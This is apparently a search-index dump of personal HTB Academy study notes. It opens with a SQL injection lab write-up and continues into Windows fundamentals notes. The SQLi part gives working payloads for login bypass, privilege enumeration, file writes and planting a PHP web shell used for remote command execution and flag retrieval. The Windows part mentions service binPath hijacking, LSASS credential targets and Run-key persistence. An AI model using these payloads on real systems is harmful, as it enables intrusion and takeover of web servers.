problem is that the code is rendered, however, we can check the HTML source of the page and we'll see the PHP code.  ","version":"Next","tagName":"h2"},{"title":"Writing files​","type":1,"pageTitle":"SQL injections","url":"/docs/Hacking/HTB Academy/SQL injections#writing-files","content":" Writing files require more privileges and more configuration:  FILE privilege enabled.MySQL global secure_file_priv variable not enabledWrite access to the location we want to write to on the back-end server  We can check the secure_file_priv variable using the SQLi:  cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -  If the result of the variable is empty, it means that we can read/write to any location.  To write to file, we can use SELECT * INTO OUTFILE &lt;filename&gt;. For example:  cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -  This will write the sentence file written successfully! into the file /var/www/html/proof.txt, which later we can download using the web server. Now that we can write files, we can even write a web shell:  cn' union select &quot;&quot;,'&lt;?php system($_REQUEST[0]); ?&gt;', &quot;&quot;, &quot;&quot; into outfile '/var/www/html/shell.php'-- -  And get RCE when visiting the shell.php page.  ","version":"Next","tagName":"h2"},{"title":"Skills assessment​","type":1,"pageTitle":"SQL injections","url":"/docs/Hacking/HTB Academy/SQL injections#skills-assessment","content":" This is the write-up for the assessment of HTB academy SQL injections module.  ","version":"Next","tagName":"h2"},{"title":"Login page​","type":1,"pageTitle":"SQL injections","url":"/docs/Hacking/HTB Academy/SQL injections#login-page","content":" First of all we're given a login page, most likely we'll need to provide a SQLi to bypass the login.  Let's evaluate which fields are vulnerable to SQLi by providing a dangling character, e.g: ' to break the query.  curl -vvv 'http://83.136.251.235:30056/' -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=\\'&amp;password=1234'   We couldn't break any field with the escape characters. We can try some of the pre-defined SQL injections from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-default-databases.  The second one worked fine:  ' OR 1 -- -   and we're presented a dashboard with a search box.  ","version":"Next","tagName":"h3"},{"title":"Search box​","type":1,"pageTitle":"SQL injections","url":"/docs/Hacking/HTB Academy/SQL injections#search-box","content":" The search box make a request like:  curl 'http://83.136.251.235:30056/dashboard/dashboard.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=t7addrm0eidu7ag6m1e7e31geo' --data-raw 'search=a'   Looks like the search only works to search the values in the date.  We should follow the same approach: let's try to break the search with escape character: ' and it worked, we can see an error.  Let's try to determine the number of columns:  a' UNION SELECT 1,2,3,4 -- -   It shows: The used SELECT statements have a different number of columns  It worked with:  a' UNION SELECT 1,2,3,4,5 -- -   But the first column is not shown  The objective is to install a web-shell, so let's enumerate if we're capable of.  a' UNION SELECT 1,user(),3,4,5 -- -   and we got root@localhost  Let's check privileges:  a' UNION SELECT 1,grantee, privilege_type,4,5 FROM information_schema.user_privileges WHERE grantee=&quot;'root'@'localhost'&quot; -- -   FILE privilege is there.  Check for write file global var:  a' UNION SELECT 1,variable_name, variable_value,4,5 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot; -- -   The variable is not set, so we can write.  Let's try it:  a' UNION SELECT 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt' -- -   Now let's try to read it, before we try to install the shell.  a' UNION SELECT 1,LOAD_FILE('/var/www/html/dashboard/proof.txt'),3,4,5 -- -   We got the contents back, so let's install the shell.  a' UNION select &quot;&quot;,'&lt;?php system($_REQUEST[0]); ?&gt;', &quot;&quot;, &quot;&quot;, &quot;&quot; into outfile '/var/www/html/dashboard/1.php' -- -   And we've got the shell http://83.136.251.235:30056/dashboard/1.php?0=id  Now we list files at root: http://83.136.251.235:30056/dashboard/1.php?0=ls%20/  Now we can retrieve the flag: http://83.136.251.235:30056/dashboard/1.php?0=cat%20/flag_cae1dadcd174.txt ","version":"Next","tagName":"h3"},{"title":"SQLite","type":0,"sectionRef":"#","url":"/docs/Hacking/Tooling/sqlite","content":"SQLite Enter the database: ``shell sqlite3 users.db Show all tables: ```shell SELECT name FROM sqlite_master WHERE type='table'; Show table schema: .schema table_name ","keywords":"","version":"Next"},{"title":"Windows fundamentals","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/Windows fundamentals","content":"","keywords":"","version":"Next"},{"title":"OS Structure​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#os-structure","content":" In Windows operating systems, the root directory is &lt;drive_letter&gt;:\\ (commonly C drive). The root directory (also known as the boot partition) is where the operating system is installed. Other physical and virtual drives are assigned other letters, for example, Data (E:). The directory structure of the boot partition is as follows:  Folder\tDescriptionPerflogs\tCan hold Windows performance logs but is empty by default. Program Files\tOn 32-bit systems, all 16-bit and 32-bit programs are installed here. On 64-bit systems, only 64-bit programs are installed here. Program Files (x86)\t32-bit and 16-bit programs are installed here on 64-bit editions of Windows. ProgramData\tA hidden folder that contains data essential for certain installed programs to run. This data is accessible by the program regardless of which user is running it. Users\tContains user profiles for each user who logs onto the system. Includes the Public and Default folders. Default\tDefault user profile template used when a new user is created. The new profile is based on this template. Public\tUsed to share files among all users. Accessible by all users and shared over the network by default (requires a valid network account). AppData\tHidden per-user application data folder (e.g., cliff.moore\\AppData) containing: - Roaming: Machine-independent data (e.g., custom dictionaries). - Local: Machine-specific data, not synchronized. - LocalLow: Lower integrity level, used by apps in safe mode (e.g., browsers). Windows\tContains most files required for the Windows operating system. System, System32, SysWOW64\tContains essential DLLs for Windows and the Windows API. These folders are searched when programs load DLLs without an absolute path. WinSxS\tThe Windows Component Store. Contains copies of all Windows components, updates, and service packs.  We can use the dir command to list the contents of a folder. Also ls will work in modern Windows.  tree command is very useful to see the directory structure. tree command can be piped to more to page the output: tree c:\\ /f | more  ","version":"Next","tagName":"h2"},{"title":"File system​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#file-system","content":" There are 5 types of Windows file systems: FAT12, FAT16, FAT32, NTFS, and exFAT. FAT12 and FAT16 are no longer used on modern Windows operating systems.  ","version":"Next","tagName":"h2"},{"title":"FAT32​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#fat32","content":" FAT32 (File Allocation Table) is widely used across many types of storage devices such as USB memory sticks and SD cards but can also be used to format hard drives. The &quot;32&quot; in the name refers to the fact that FAT32 uses 32 bits of data for identifying data clusters on a storage device.  Pros of FAT32:  Device compatibility - it can be used on computers, digital cameras, gaming consoles, smartphones, tablets, and more.Operating system cross-compatibility - It works on all Windows operating systems starting from Windows 95 and is also supported by MacOS and Linux.  Cons of FAT32:  Can only be used with files that are less than 4GB.No built-in data protection or file compression features.Must use third-party tools for file encryption.  ","version":"Next","tagName":"h3"},{"title":"NTFS​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#ntfs","content":" NTFS (New Technology File System) is the default Windows file system since Windows NT 3.1. In addition to making up for the shortcomings of FAT32, NTFS also has better support for metadata and better performance due to improved data structuring.  Pros of NTFS:  NTFS is reliable and can restore the consistency of the file system in the event of a system failure or power loss.Provides security by allowing us to set granular permissions on both files and folders.Supports very large-sized partitions.Has journaling built-in, meaning that file modifications (addition, modification, deletion) are logged.  Cons of NTFS:  Most mobile devices do not support NTFS natively.Older media devices such as TVs and digital cameras do not offer support for NTFS storage devices.  The NTFS file system has many basic and advanced permissions. Some of the key permission types are:  Permission\tDescriptionFull Control\tAllows reading, writing, changing, and deleting of files/folders. Modify\tAllows reading, writing, and deleting of files/folders. List Folder Contents\tAllows viewing and listing folders and subfolders, as well as executing files. Folders only inherit this permission. Read and Execute\tAllows viewing and listing files and subfolders, as well as executing files. Inherited by both files and folders. Write\tAllows adding files to folders/subfolders and writing to files. Read\tAllows viewing and listing of folders/subfolders and viewing file contents. Traverse Folder\tAllows moving through folders to reach other files/folders without needing permission to list folder contents. For example, with this permission, a user can access a file like c:\\users\\bsmith\\documents\\webapps\\backups\\backup_02042020.zip even without access to intermediate folders.  Files and folders inherit the NTFS permissions of their parent folder for ease of administration. If permissions do need to be set explicitly, an administrator can disable permissions inheritance for the necessary files and folders and then set the permissions directly on each.  We can use the UI to setup the permissions, or the icacls command:  C:\\htb&gt; icacls c:\\windows c:\\windows NT SERVICE\\TrustedInstaller:(F) NT SERVICE\\TrustedInstaller:(CI)(IO)(F) NT AUTHORITY\\SYSTEM:(M) NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(F) BUILTIN\\Administrators:(M) BUILTIN\\Administrators:(OI)(CI)(IO)(F) BUILTIN\\Users:(RX) BUILTIN\\Users:(OI)(CI)(IO)(GR,GE) CREATOR OWNER:(OI)(CI)(IO)(F) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(RX) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE) Successfully processed 1 files; Failed processing 0 files   The codes at the end mean:  (CI): container inherit(OI): object inherit(IO): inherit only(NP): do not propagate inherit(I): permission inherited from parent containerF : full accessD : delete accessN : no accessM : modify accessRX : read and execute accessR : read-only accessW : write-only access  Refer to https://ss64.com/nt/icacls.html for a full guide on the icacls command.  ","version":"Next","tagName":"h3"},{"title":"Sharing​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#sharing","content":" The Server Message Block protocol (SMB) is used in Windows to connect shared resources like files and printers.  NTFS permissions and share permissions are often understood to be the same. Please know that they are not the same but often apply to the same shared resource.  Share permissions:  Permission\tDescriptionFull Control\tUsers are permitted to perform all actions given by Change and Read permissions, as well as change permissions for NTFS files and subfolders. Change\tUsers are permitted to read, edit, delete, and add files and subfolders. Read\tUsers are allowed to view file and subfolder contents.  NTFS permissions:  Permission\tDescriptionFull Control\tUsers are permitted to add, edit, move, and delete files &amp; folders, as well as change NTFS permissions that apply to all allowed folders. Modify\tUsers are permitted or denied permissions to view and modify files and folders, including adding or deleting files. Read &amp; Execute\tUsers are permitted or denied permissions to read the contents of files and execute programs. List Folder Contents\tUsers are permitted or denied permissions to view a listing of files and subfolders. Read\tUsers are permitted or denied permissions to read the contents of files. Write\tUsers are permitted or denied permissions to write changes to a file and add new files to a folder. Traverse Folder / Execute File\tUsers are permitted or denied permissions to access a subfolder within a directory structure even if access to the parent folder is denied. Also allows execution of programs. List Folder / Read Data\tUsers are permitted or denied permissions to view files and folders in the parent folder. Also allows opening and viewing files. Read Attributes\tUsers are permitted or denied permissions to view basic attributes of a file or folder (e.g., system, archive, read-only, hidden). Read Extended Attributes\tUsers are permitted or denied permissions to view extended attributes of a file or folder. These vary by program. Create Files / Write Data\tUsers are permitted or denied permissions to create files within a folder and modify file contents. Create Folders / Append Data\tUsers are permitted or denied permissions to create subfolders. Allows data to be appended to existing files without overwriting. Write Attributes\tUsers are permitted or denied permissions to change file attributes. Does not allow creating files or folders. Write Extended Attributes\tUsers are permitted or denied permissions to change extended attributes of a file or folder. These vary by program. Delete Subfolders and Files\tUsers are permitted or denied permissions to delete subfolders and files, but not the parent folder itself. Delete\tUsers are permitted or denied permissions to delete parent folders, subfolders, and files. Read Permissions\tUsers are permitted or denied permissions to read the permissions set on a file or folder. Change Permissions\tUsers are permitted or denied permissions to change the permissions on a file or folder. Take Ownership\tUsers are permitted or denied permissions to take ownership of a file or folder. File owners can change any permissions.  Keep in mind that NTFS permissions apply to the system where the folder and files are hosted. Folders created in NTFS inherit permissions from parent folders by default.  The share permissions apply when the folder is being accessed through SMB, typically from a different system over the network.  This means someone logged in locally to the machine or via RDP can access the shared folder and files by simply navigating to the location on the file system and only need to consider NTFS permissions.  The permissions at the NTFS level provide administrators much more granular control over what users can do within a folder or file.  Windows Defender Firewall Considerations: The Windows Defender Firewall could potentially be blocking access to the SMB share. If we are connecting from a Linux-based system the firewall will block access since it will block access from any device that is not joined to the same workgroup. It is also important to note that when a Windows system is part of a workgroup, all netlogon requests are authenticated against that particular Windows system's SAM database. When a Windows system is joined to a Windows Domain environment, all netlogon requests are authenticated against Active Directory. Local SAM database is used for login with workgroupActive Directory is used for login with Windows Domain  Once a SMB share is ready, we can mount it in a Linux machine by running:  sudo mount -t cifs -o username=htb-student,password=Academy_WinFun! //ipaddoftarget/&quot;Company Data&quot; /home/user/Desktop/   In Windows, we can use net share command to see what is actually sharing. Surprisingly, we see that C:\\ is shared:  C:\\Users\\htb-student&gt; net share Share name Resource Remark ------------------------------------------------------------------------------- C$ C:\\ Default share IPC$ Remote IPC ADMIN$ C:\\WINDOWS Remote Admin Company Data C:\\Users\\htb-student\\Desktop\\Company Data The command completed successfully.   We didn't manually share C:. The most important drive with the most critical files on a Windows system is shared via SMB at install. This means anyone with the proper access could remotely access the entire C:\\ of each Windows system on a network.  You can also use Computer Management if you want a GUI to manage Shares, Sessions or Open files.  You can view access logs of the shared data in Event Viewer. For example, we can view the logs created for every action we performed when accessing the Windows 10 target box, as well as when creating, editing and accessing the shared folder.  ","version":"Next","tagName":"h2"},{"title":"Windows Services and processes​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#windows-services-and-processes","content":" Services are a major component of the Windows operating system. They allow for the creation and management of long-running processes. Windows services can be started automatically at system boot without user intervention. These services can continue to run in the background even after the user logs out of their account on the system.  Windows services are managed via the Service Control Manager (SCM) system, accessible via the services.msc MMC add-in. It is also possible to query and manage services via the command line using sc.exe using PowerShell cmdlets such as Get-Service.   PS C:\\htb&gt; Get-Service | ? {$_.Status -eq &quot;Running&quot;} | select -First 2 |fl Name : AdobeARMservice DisplayName : Adobe Acrobat Update Service Status : Running DependentServices : {} ServicesDependedOn : {} CanPauseAndContinue : False CanShutdown : False CanStop : True ServiceType : Win32OwnProcess Name : Appinfo DisplayName : Application Information Status : Running DependentServices : {} ServicesDependedOn : {RpcSs, ProfSvc} CanPauseAndContinue : False CanShutdown : False CanStop : True ServiceType : Win32OwnProcess, Win32ShareProcess   Service statuses can appear as Running, Stopped, or Paused, and they can be set to start manually, automatically, or on a delay at system boot. Services can also be shown in the state of Starting or Stopping if some action has triggered them to either start or stop. Windows has three categories of services: Local Services, Network Services, and System Services. Services can usually only be created, modified, and deleted by users with administrative privileges.  Misconfigurations around service permissions are a common privilege escalation vector on Windows systems.  You can see a list of services here: https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_components#Services  Think of services as the daemon equivalent of Linux.  ","version":"Next","tagName":"h2"},{"title":"Processes​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#processes","content":" Processes run in the background on Windows systems. They either run automatically as part of the Windows operating system or are started by other installed applications.  Processes run in the background on Windows systems. They either run automatically as part of the Windows operating system or are started by other installed applications.  Processes associated with installed applications can often be terminated without causing a severe impact on the operating system. Certain processes are critical and, if terminated, will stop certain components of the operating system from running properly. Some examples include the Windows Logon Application, System, System Idle Process, Windows Start-Up Application, Client Server Runtime, Windows Session Manager, Service Host, and Local Security Authority Subsystem Service (LSASS) process.  lsass.exe is the process that is responsible for enforcing the security policy on Windows systems. When a user attempts to log on to the system, this process verifies their log on attempt and creates access tokens based on the user's permission levels. LSASS is also responsible for user account password changes. All events associated with this process (logon/logoff attempts, etc.) are logged within the Windows Security Log. LSASS is an extremely high-value target as several tools exist to extract both cleartext and hashed credentials stored in memory by this process.  There are some tools provided by Microsoft that allow pentester to explore processes and discover possible privilege escalation paths as well as lateral movements.  The tools are called SysInternals Tools Suite and can be downloaded here: https://docs.microsoft.com/en-us/sysinternals.  They even can be accessed via a Public share without the need to download them:  C:\\htb&gt; \\\\live.sysinternals.com\\tools\\procdump.exe -accepteula ProcDump v9.0 - Sysinternals process dump utility Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards Sysinternals - www.sysinternals.com Monitors a process and writes a dump file when the process exceeds the specified criteria or has an exception. Capture Usage: procdump.exe [-mm] [-ma] [-mp] [-mc Mask] [-md Callback_DLL] [-mk] [-n Count] [-s Seconds] [-c|-cl CPU_Usage [-u]] ...   We can see the processes running using the Task Manager. The typical CTRL + ALT + DEL or running taskmgr from shell.  ","version":"Next","tagName":"h3"},{"title":"Service permissions​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#service-permissions","content":" Services usually can be abused for privilege escalations due to permission miss-configurations, put in place by 3rd party software and easy to make mistakes by admins during install processes.  We can use services.msc to view and manage just about every detail regarding all services. Here we can see things like Service name, Path to the executable, Log on account.  Knowing the service name is especially useful when using command-line tools to examine and manage services.  Path to the executable is the full path to the program and command to execute when the service starts. If the NTFS permissions of the destination directory are configured with weak permissions, an attacker could replace the original executable with one created for malicious purposes.  Most services run with LocalSystem privileges by default which is the highest level of access allowed on an individual Windows OS. Not all applications need Local System account-level permissions  The recovery tab allows steps to be configured should a service fail. Notice how this service can be set to run a program after the first failure. This is yet another vector that an attacker could use to run malicious programs by utilizing a legitimate service.  We can do the same with sc command line utility:  C:\\Users\\htb-student&gt;sc qc wuauserv [SC] QueryServiceConfig SUCCESS SERVICE_NAME: wuauserv TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Windows Update DEPENDENCIES : rpcss SERVICE_START_NAME : LocalSystem   qc is for querying  We can run it in network:  sc //hostname or ip of box query ServiceName   Or, we can use it to manage services:  C:\\Users\\htb-student&gt; sc stop wuauserv [SC] OpenService FAILED 5: Access is denied.   or modify the config of the services:  C:\\WINDOWS\\system32&gt; sc config wuauserv binPath=C:\\Winbows\\Perfectlylegitprogram.exe [SC] ChangeServiceConfig SUCCESS C:\\WINDOWS\\system32&gt; sc qc wuauserv [SC] QueryServiceConfig SUCCESS SERVICE_NAME: wuauserv TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Winbows\\Perfectlylegitprogram.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Windows Update DEPENDENCIES : rpcss SERVICE_START_NAME : LocalSystem   Another helpful way we can examine service permissions using sc is through the sdshow command:  C:\\WINDOWS\\system32&gt; sc sdshow wuauserv D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(AU;FA;CCDCLCSWRPWPDTLOSDRCWDWO;;;WD)   This gibberish is the security descriptor (SD) of the service and uses Security Descriptor Definition Language (SDDL) which describes an access control list of the service.  Similarly, we can run Get-Acl in Powershell:  PS C:\\Users\\htb-student&gt; Get-ACL -Path HKLM:\\System\\CurrentControlSet\\Services\\wuauserv | Format-List Path : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\wuauserv Owner : NT AUTHORITY\\SYSTEM Group : NT AUTHORITY\\SYSTEM Access : BUILTIN\\Users Allow ReadKey BUILTIN\\Users Allow -2147483648 BUILTIN\\Administrators Allow FullControl BUILTIN\\Administrators Allow 268435456 NT AUTHORITY\\SYSTEM Allow FullControl NT AUTHORITY\\SYSTEM Allow 268435456 CREATOR OWNER Allow 268435456 APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES Allow ReadKey APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES Allow -2147483648 S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow ReadKey S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow -2147483648 Audit : Sddl : O:SYG:SYD:AI(A;ID;KR;;;BU)(A;CIIOID;GR;;;BU)(A;ID;KA;;;BA)(A;CIIOID;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A ;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654 721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S-1-15-3-1024-1065365936-1281604716-351173842 8-1654721687-432734479-3232135806-4053264122-3456934681)   Notice how this command returns specific account permissions in an easy-to-read format and in SDDL. Also, the SID that represents each security principal (User and/or Group) is present in the SDDL. This is something we do not get when running sc from the command prompt.  ","version":"Next","tagName":"h2"},{"title":"Windows Sessions​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#windows-sessions","content":" Interactive: An interactive, or local logon session, is initiated by a user authenticating to a local or domain system by entering their credentials. An interactive logon can be initiated by logging directly into the system, by requesting a secondary logon session using the runas command via the command line, or through a Remote Desktop connection. Non-interactive: they do not require login credentials. on-interactive accounts are generally used by the Windows operating system to automatically start services and applications without requiring user interaction. These accounts have no password associated with them and are usually used to start services when the system boots or to run scheduled tasks.  There are three types:  Local System Account or (NT AUTHORITY\\SYSTEM ): It is used for a variety of OS-related tasks, such as starting Windows services. This account is more powerful than accounts in the local administrators group.Local Service Account or (NT AUTHORITY\\LocalService): this is a less privileged version of the SYSTEM account and has similar privileges to a local user account. It is granted limited functionality and can start some services.Network Service Account or (NT AUTHORITY\\NetworkService): similar to a standard domain user account. It has similar privileges to the Local Service Account on the local machine. It can establish authenticated sessions for certain network services.  ","version":"Next","tagName":"h2"},{"title":"Interacting with Windows​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#interacting-with-windows","content":" GUI: using mouse and keyboard.RDP: access the GUI from another networked deviceWindows Command Line: automate things, create scripts, etc. We can distinguish two types of command lines: CMD: The Command Prompt (cmd.exe) is used to enter and execute commands.Powershell: built on top of the .NET Framework, which is used for building and running applications on Windows. This makes it a very powerful tool for interfacing directly with the operating system. PowerShell utilizes cmdlets, which are small single-function tools built into the shell.  Many cmdlets in PowerShell also have aliases. For example, the aliases for the cmdlet Set-Location, to change directories, is either cd or sl. Meanwhile, the aliases for Get-ChildItem are ls and gci. We can view all available aliases by typing Get-Alias.  One common way to work with a script in PowerShell is to import it so that all functions are then available within our current PowerShell console session: Import-Module .\\PowerView.ps1.  Sometimes we will find that we are unable to run scripts on a system. This is due to a security feature called the execution policy. Here, there are the different values:  Policy\tDescriptionAllSigned\tAll scripts can run, but a trusted publisher must sign scripts and configuration files (both remote and local). A prompt appears before running scripts signed by publishers not yet marked as trusted or untrusted. Bypass\tNo scripts or configuration files are blocked, and the user receives no warnings or prompts. Default\tSets the default execution policy: Restricted on Windows desktop systems, RemoteSigned on Windows Server systems. RemoteSigned\tScripts can run, but downloaded scripts must be digitally signed. Locally written scripts do not require signatures. Restricted\tOnly individual commands are allowed; scripts are blocked. Blocks all script file types (e.g., .ps1xml, .psm1, .ps1). Undefined\tNo execution policy is set for the current scope. If all scopes are set to undefined, the system defaults to Restricted. Unrestricted\tDefault for non-Windows computers and cannot be changed. Allows all scripts to run.  The execution policy is not meant to be a security control that restricts user actions. A user can easily bypass the policy by either typing the script contents directly into the PowerShell window, downloading and invoking the script, or specifying the script as an encoded command. It can also be bypassed by adjusting the execution policy (if the user has the proper rights) or setting the execution policy for the current process scope (which can be done by almost any user as it does not require a configuration change and will only be set for the duration of the user's session).  ","version":"Next","tagName":"h2"},{"title":"Windows Management Instrumentation (WMI)​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#windows-management-instrumentation-wmi","content":" WMI is a subsystem of PowerShell that provides system administrators with powerful tools for system monitoring. Some of the uses for WMI are:  Status information for local/remote systemsConfiguring security settings on remote machines/applicationsSetting and changing user and group permissionsSetting/modifying system propertiesCode executionScheduling processesSetting up logging  For example:  wmic os list brief   To use it from PowerShell, we can use Get-WmiObject:  Get-WmiObject -Class Win32_OperatingSystem | select SystemDirectory,BuildNumber,SerialNumber,Version | ft   and Invoke-WmiObject:  Invoke-WmiMethod -Path &quot;CIM_DataFile.Name='C:\\users\\public\\spns.csv'&quot; -Name Rename -ArgumentList &quot;C:\\Users\\Public\\kerberoasted_users.csv&quot;   ","version":"Next","tagName":"h2"},{"title":"Microsoft Management Console (MMC)​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#microsoft-management-console-mmc","content":" The MMC can be used to group snap-ins, or administrative tools, to manage hardware, software, and network components within a Windows host. To start it, type mmc in the Start Menu.  From here, we can browse to File --&gt; Add or Remove Snap-ins, and begin customizing our administrative console.  ","version":"Next","tagName":"h2"},{"title":"Windows Subsystem for Linux (WSL)​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#windows-subsystem-for-linux-wsl","content":" WSL is a feature that allows Linux binaries to be run natively on Windows 10 and Windows Server 2019.  WSL can be installed by running the PowerShell command Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux as an Administrator.  WSL installs an application called Bash.exe, which can be run by merely typing bash into a Windows console to spawn a Bash shell.  ","version":"Next","tagName":"h2"},{"title":"Windows security​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#windows-security","content":" Security is a critical topic in Windows operating systems. Windows systems have many moving parts that present a vast attack surface. Due to the many built-in applications, features, and layers of settings, Windows systems can be easily misconfigured, thus opening them up to attack even if they are fully patched.  ","version":"Next","tagName":"h2"},{"title":"Security Identifier (SID)​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#security-identifier-sid","content":" Each of the security principals on the system has a unique security identifier (SID). The system automatically generates SIDs. This means that even if, for example, we have two identical users on the system, Windows can distinguish the two and their rights based on their SIDs. SIDs are string values with different lengths, which are stored in the security database. These SIDs are added to the user's access token to identify all actions that the user is authorized to take.  A SID consists of the Identifier Authority and the Relative ID (RID). In an Active Directory (AD) domain environment, the SID also includes the domain SID.  PS C:\\htb&gt; whoami /user USER INFORMATION ---------------- User Name SID =================== ============================================= ws01\\bob S-1-5-21-674899381-4069889467-2080702030-1002   The format is (SID)-(revision level)-(identifier-authority)-(subauthority1)-(subauthority2)-(etc).  In this example:  Number\tMeaning\tDescriptionS\tSID\tIdentifies the string as a SID. 1\tRevision Level\tTo date, this has never changed and has always been 1. 5\tIdentifier Authority\tA 48-bit string that identifies the authority (the computer or network) that created the SID. 21\tSubauthority1\tA variable number identifying the user's relation or group to the authority that created the SID. Indicates the order in which the account was created. 674899381-4069889467-2080702030\tSubauthority2\tIdentifies which computer or domain created the number. 1002\tSubauthority3\tThe RID (Relative Identifier) that distinguishes one account from another. Indicates whether the user is a normal user, guest, administrator, or part of another group.  ","version":"Next","tagName":"h3"},{"title":"Security Accounts Manager (SAM) and Access Control Entries (ACE)​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#security-accounts-manager-sam-and-access-control-entries-ace","content":" SAM grants rights to a network to execute specific processes.  The access rights themselves are managed by Access Control Entries (ACE) in Access Control Lists (ACL). The ACLs contain ACEs that define which users, groups, or processes have access to a file or to execute a process, for example.  The permissions to access a securable object are given by the security descriptor, classified into two types of ACLs: the Discretionary Access Control List (DACL) or System Access Control List (SACL). Every thread and process started or initiated by a user goes through an authorization process. An integral part of this process is access tokens, validated by the Local Security Authority (LSA). In addition to the SID, these access tokens contain other security-relevant information. Understanding these functionalities is an essential part of learning how to use and work around these security mechanisms during the privilege escalation phase.  ","version":"Next","tagName":"h3"},{"title":"User Account Control (UAC)​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#user-account-control-uac","content":" User Account Control (UAC) is a security feature in Windows to prevent malware from running or manipulating processes that could damage the computer or its contents.  There is the Admin Approval Mode in UAC, which is designed to prevent unwanted software from being installed without the administrator's knowledge or to prevent system-wide changes from being made.  This is the typical display that ask for consent to install a software on Windows because the install process requires Admin privileges.  You can find how the UAC works here: https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works  ","version":"Next","tagName":"h3"},{"title":"Registry​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#registry","content":" The Registry is a hierarchical database in Windows critical for the operating system. It stores low-level settings for the Windows operating system and applications that choose to use it. To see, you just need to execute regedit command. It has a tree structure.  Each folder under Computer is a key. The root keys all start with HKEY. A key such as HKEY-LOCAL-MACHINE is abbreviated to HKLM.  The following keys:  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce  are useful for maintaining access to the system. For example:  PS C:\\htb&gt; reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run OneDrive REG_SZ &quot;C:\\Users\\bob\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe&quot; /background OPENVPN-GUI REG_SZ C:\\Program Files\\OpenVPN\\bin\\openvpn-gui.exe Docker Desktop 